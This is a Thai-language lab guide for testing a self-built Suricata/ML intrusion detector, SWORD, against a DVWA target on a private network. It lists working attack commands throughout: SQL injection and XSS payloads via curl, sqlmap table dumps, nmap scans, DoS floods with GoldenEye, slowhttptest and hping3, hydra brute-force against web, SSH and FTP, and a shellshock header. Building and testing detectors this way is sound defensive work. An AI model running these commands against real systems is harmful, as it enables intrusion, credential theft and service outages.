# SWORD — คำสั่งทดสอบ DVWA (port 8080) พร้อม cookie จริง

> Kali `192.168.1.54` → target `192.168.1.52:8080` (DVWA, security=low)
> ทดสอบในแล็บตัวเองเท่านั้น

---

## ⚠️ กฎเหล็ก (ห้ามพลาด)

1. **เปิด SWORD ก่อนเสมอ แล้วค่อยยิง** — SWORD อ่าน eve.json จากท้ายไฟล์
   (เห็นเฉพาะ event ใหม่หลังเปิด) ยิงก่อนเปิด = มองไม่เห็น = 0 alert
2. รอเห็นบรรทัด `เริ่มตรวจสอบ` + `~2 วิ` ให้ seek เสร็จก่อนยิง
3. **DoS** ต้องเปิดเว็บ 8080 ปกติเรียน baseline **10-15 นาที** ก่อนค่อยยิง
4. **Web (XSS/SQLi)** ต้องเป็น HTTP (8080) ไม่ใช่ HTTPS
5. **POST body** ต้องเปิด `request-body-limit` ใน suricata.yaml ก่อน (ดูท้ายไฟล์)

---

## 0. เปิด SWORD (เครื่อง target 192.168.1.52) — ทำก่อนทุกครั้ง

```bash
cd ~/SWORD_web/SWORD
python3 hybrid_nids.py --realtime /var/log/suricata/eve.json --xgb_only
# รอเห็น "เริ่มตรวจสอบ" แล้วค่อยไปยิงจาก Kali
```

---

## ตั้งตัวแปรบน Kali (วางครั้งเดียว ใช้ได้ทุกคำสั่ง)

```bash
TARGET=192.168.1.52
PORT=8080
BASE=http://$TARGET:$PORT
COOKIE="PHPSESSID=gkolduni88hvhhl36pgmh87j8a; security=low"
```

---

## 1. SQL Injection (GET) → `Method: PIPELINE_2_PAYLOAD_ML`

```bash
# OR 1=1 คลาสสิก
curl -b "$COOKIE" "$BASE/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"

# UNION ดึง user/password
curl -b "$COOKIE" "$BASE/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- -&Submit=Submit"

# DROP TABLE
curl -b "$COOKIE" "$BASE/vulnerabilities/sqli/?id=1'; DROP TABLE users-- -&Submit=Submit"

# comment bypass
curl -b "$COOKIE" "$BASE/vulnerabilities/sqli/?id=admin'-- -&Submit=Submit"

# blind (time-based)
curl -b "$COOKIE" "$BASE/vulnerabilities/sqli_blind/?id=1' AND SLEEP(3)-- -&Submit=Submit"
```
**คาดหวัง:** `SQL Injection` conf 0.5–1.0 (payload ชัด = 0.9+)

---

## 2. XSS (GET) → `Method: PIPELINE_2_PAYLOAD_ML`

```bash
curl -b "$COOKIE" "$BASE/vulnerabilities/xss_r/?name=<script>alert(1)</script>"
curl -b "$COOKIE" "$BASE/vulnerabilities/xss_r/?name=<img src=x onerror=alert(document.cookie)>"
curl -b "$COOKIE" "$BASE/vulnerabilities/xss_r/?name=<svg onload=alert(1)>"
curl -b "$COOKIE" "$BASE/vulnerabilities/xss_r/?name=javascript:alert(document.cookie)"
```
**คาดหวัง:** `Cross-Site Scripting (XSS)` conf 0.5–1.0

---

## 3. sqlmap (automated SQLi) → SQLi + อาจมี DoS rate ด้วย

```bash
sqlmap -u "$BASE/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="$COOKIE" --batch --dbs

# ดึงข้อมูลลึกขึ้น
sqlmap -u "$BASE/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="$COOKIE" --batch -D dvwa -T users --dump
```
**หมายเหตุ:** sqlmap ยิงถี่ อาจได้ทั้ง `SQL Injection` **และ** `DoS rate anomaly`
พร้อมกัน = ปกติ (สะท้อนว่าเป็น automated high-rate tool) ถ้าไม่อยากได้ DoS
ตั้ง `ENABLE_DOS_RATE = False` ในไฟล์ หรือ warmup baseline ก่อน

---

## 4. Port Scan → `Method: TEMPORAL_FANOUT`

> สแกน "host" ไม่เกี่ยวกับ 8080/cookie — ต้องแตะ ≥15 port ถึงยิง

```bash
nmap -sS $TARGET                    # SYN scan
nmap -sS -p- $TARGET                # ทุก 65535 port (ชัดสุด)
nmap -sT $TARGET                    # TCP connect scan
nmap -sV $TARGET                    # version detection
nmap -sS -T1 --top-ports 100 $TARGET  # ช้า (ทดสอบว่ายังจับได้)
```
**คาดหวัง:** `Port Scan (N distinct ports in 60s)` ครั้งเดียว (dedup)

---

## 5. DoS → `Method: ADAPTIVE_RATE_ANOMALY`  (warmup baseline ก่อน!)

```bash
# --- warmup: เปิดเว็บ 8080 ปกติ 10-15 นาทีก่อน ---
for i in $(seq 1 200); do curl -s -b "$COOKIE" "$BASE/" >/dev/null; sleep 3; done

# GoldenEye — HTTP flood
git clone https://github.com/jseidl/GoldenEye.git && cd GoldenEye
python3 goldeneye.py $BASE/ -w 10 -s 10 -m get
python3 goldeneye.py $BASE/ -w 20 -s 30 -m random     # หนักขึ้น

# slowloris / slow DoS
slowhttptest -c 500 -H -i 10 -r 200 -t GET -u $BASE/ -x 24 -p 3

# hping3 SYN flood (ต้อง sudo)
sudo hping3 -S -p $PORT --flood $TARGET
sudo hping3 -S -p $PORT -i u50000 $TARGET             # ช้า ~20 pkt/s (ทดสอบ slow DoS)

# ApacheBench
ab -n 100000 -c 200 $BASE/
```
**คาดหวัง:** `DoS rate anomaly (X req/s, outlier vs learned baseline)` **ระหว่างโจมตี**

**ทดสอบ FP (ไม่ควรเป็น DoS):**
```bash
for i in $(seq 1 30); do curl -s -b "$COOKIE" "$BASE/" >/dev/null; done  # burst สั้น
```

---

## 6. BruteForce → `Method: ML` + repetition gate

```bash
# DVWA brute-force page (GET form) — ต้องส่ง cookie ผ่าน hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET -s $PORT \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: $COOKIE"

# SSH brute (ถ้า target เปิด SSH)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$TARGET

# FTP brute (ถ้าเปิด FTP)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$TARGET
```
**คาดหวัง:** `Brute Force Attack` หลังลองซ้ำ **≥4 ครั้งใน 20s** ไป port เดียวกัน

---

## 7. Suricata Signature → `Method: SURICATA_SIGNATURE`

```bash
nmap -sV --script=banner $TARGET                          # ET SCAN
nikto -h $BASE                                            # web scanner (ยิง URL น่าสงสัยเยอะ)
curl -A "() { :; }; echo vulnerable" $BASE/               # shellshock
```
> noise พวก ET INFO/POLICY/USER_AGENTS/DNS/TLS/JA3/GPL ถูกกรองแล้ว (v5.11)
> เหลือแต่ signature ที่เป็น attack จริง

---

## 8. POST body (SQLi/XSS ใน body) — ต้องเปิด config ก่อน

แก้ `/etc/suricata/suricata.yaml`:
```yaml
app-layer:
  protocols:
    http:
      enabled: yes
      libhtp:
        default-config:
          request-body-limit: 8kb      # เดิม 0 = ไม่ log body
          response-body-limit: 8kb
```
```bash
sudo systemctl restart suricata
# แล้วค่อยทดสอบ POST
curl -b "$COOKIE" -d "id=1' OR '1'='1&Submit=Submit" "$BASE/vulnerabilities/sqli/"
```

---

## 9. ตรวจผลฝั่ง SWORD (ยืนยันจับได้จริง)

```bash
# alert ที่ SWORD เขียน
tail -f ~/SWORD_web/SWORD/sword_detection_logs/ml_log.json

# ยืนยัน Suricata เห็น payload จริง (timestamp ต้อง "หลัง" เปิด SWORD)
sudo jq -c 'select(.event_type=="http" and (.http.url // "" | test("script|OR|UNION|SELECT|alert"))) | {t:.timestamp, url:.http.url}' \
    /var/log/suricata/eve.json | tail
```

---

## ตารางสรุป (attack → method)

| Attack | คำสั่ง | SWORD Method | ประเภท |
|---|---|---|---|
| SQLi (GET) | `curl ...sqli/?id=1' OR 1=1` | PIPELINE_2_PAYLOAD_ML | ML |
| XSS | `curl ...xss_r/?name=<script>` | PIPELINE_2_PAYLOAD_ML | ML |
| SQLi (auto) | `sqlmap` | PAYLOAD_ML (+ADAPTIVE_RATE) | ML+สถิติ |
| Port Scan | `nmap -sS` | TEMPORAL_FANOUT | สถิติ |
| DoS flood | `goldeneye` / `hping3 --flood` | ADAPTIVE_RATE_ANOMALY | สถิติ |
| Slow DoS | `slowhttptest` | ADAPTIVE_RATE_ANOMALY | สถิติ |
| BruteForce | `hydra` | ML + repetition gate | ML+สถิติ |
| Signature | `nikto` / shellshock | SURICATA_SIGNATURE | signature |
